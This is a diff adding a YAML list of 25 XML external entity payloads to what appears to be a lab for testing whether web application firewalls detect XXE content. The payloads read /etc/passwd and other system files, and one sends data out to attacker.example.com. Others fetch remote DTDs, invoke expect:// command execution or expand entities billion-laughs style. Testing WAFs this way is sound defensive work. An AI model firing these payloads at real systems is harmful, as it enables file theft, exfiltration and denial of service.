@@ -1,0 +1,185 @@
+# XML external entity payloads — 25 entries. WAF-view only.
+# Sources: PayloadsAllTheThings/XXE Injection, OWASP WSTG §4.7.5,
+# Detectify XXE blog series, OWASP API Top-10 2023 (#8 SSRF/XXE).
+#
+# These are sent as string payloads through the existing reflective sinks
+# (no live XML parser in DVWA/Juice Shop/WebGoat). The point is to test
+# whether each WAF inspects user-supplied XML-shaped content for entity
+# definitions and external-resource references. The context_displacement
+# mutator additionally re-sends them with Content-Type: application/xml
+# bodies, exercising the WAFs' XML body-inspection paths.
+
+- id: xxe-passwd-basic
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+  trigger: &T200 { kind: status, code: 200 }
+  cwe: CWE-611
+  source: "PayloadsAllTheThings/XXE — baseline file read"
+
+- id: xxe-hosts
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hosts\">]><r>&x;</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "OWASP WSTG v4.2 §4.7.5"
+
+- id: xxe-fstab
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/fstab\">]><r>&x;</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "Alternate sensitive-file probe (avoids destructive-pattern filter)"
+
+- id: xxe-windows-ini
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><r>&x;</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "Windows variant — file:// path"
+
+- id: xxe-external-dtd
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"http://127.0.0.1:9/evil.dtd\"><r>waflab-xxe-probe</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — external DTD"
+
+- id: xxe-external-dtd-https
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"https://attacker.example.com/evil.dtd\"><r>x</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "External DTD over HTTPS — defeats http-only filters"
+
+- id: xxe-param-entity
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % a SYSTEM \"file:///etc/passwd\"> %a;]><r>1</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — parameter entity"
+
+- id: xxe-param-oob
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b SYSTEM \"http://attacker.example.com/?x=%a;\"> %b;]><r>1</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "Out-of-band XXE exfil (OOB) — chained parameter entities"
+
+- id: xxe-xinclude
+  class: xxe
+  payload: "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — XInclude"
+
+- id: xxe-xinclude-fallback
+  class: xxe
+  payload: "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"><xi:fallback>fail</xi:fallback></xi:include></r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "XInclude with fallback — defeats schema validators"
+
+- id: xxe-soap-style
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x \"waflab-xxe-probe\">]><env:Envelope><env:Body><r>&x;</r></env:Body></env:Envelope>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — SOAP envelope"
+
+- id: xxe-php-filter
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — PHP wrapper in XXE"
+
+- id: xxe-expect-rce
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PHP expect:// wrapper — RCE primitive"
+
+- id: xxe-nested-entity
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY a \"waflab-\"><!ENTITY b \"xxe-probe\"><!ENTITY c \"&a;&b;\">]><r>&c;</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — nested entities"
+
+- id: xxe-billion-laughs
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY a \"AAAAAAAA\"><!ENTITY b \"&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;\"><!ENTITY d \"&c;&c;&c;&c;\">]><r>&d;</r>"
+  trigger: *T200
+  cwe: CWE-776
+  source: "Billion-laughs DoS pattern (small N, but the shape is the marker)"
+
+- id: xxe-utf7
+  class: xxe
+  payload: "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADwAIQ-DOCTYPE r +AFs-+ADwAIQ-ENTITY x +ACI-waflab-xxe-probe+ACI-+AF0APg-+ADw-r+AD4-+ACY-x+ADsAPA-/r+AD4-"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — encoding trick"
+
+- id: xxe-utf16
+  class: xxe
+  payload: "﻿<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE r [<!ENTITY x \"waflab\">]><r>&x;</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "UTF-16 BOM — defeats encoding-naive WAFs"
+
+- id: xxe-data-uri
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"data:text/plain,waflab-xxe-probe\">]><r>&x;</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PayloadsAllTheThings — data URI entity"
+
+- id: xxe-no-doctype-name
+  class: xxe
+  payload: "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "Missing XML decl — some validators skip DOCTYPE inspection"
+
+- id: xxe-public-id
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r PUBLIC \"-//OASIS//DTD waflab//EN\" \"file:///etc/passwd\"><r>1</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "PUBLIC DTD identifier — alternate trigger path"
+
+- id: xxe-svg-image
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&x;</text></svg>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "SVG-wrapped XXE — image-upload sinks"
+
+- id: xxe-office-doc
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE w:document [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body>&x;</w:body></w:document>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "OOXML-wrapped XXE — Word doc upload pattern"
+
+- id: xxe-csrf-via-xml
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><x><a>1</a></x>"
+  trigger: *T200
+  cwe: CWE-352
+  source: "Plain XML body — CSRF via Content-Type:application/xml"
+
+- id: xxe-blind-stuxnet
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % a SYSTEM \"http://attacker.example.com/x.dtd\"> %a;]><r>1</r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "Blind OOB — staged DTD fetch then exfil"
+
+- id: xxe-cdata-trick
+  class: xxe
+  payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r><![CDATA[before]]>&x;<![CDATA[after]]></r>"
+  trigger: *T200
+  cwe: CWE-611
+  source: "CDATA wrapping — defeats some content validators"
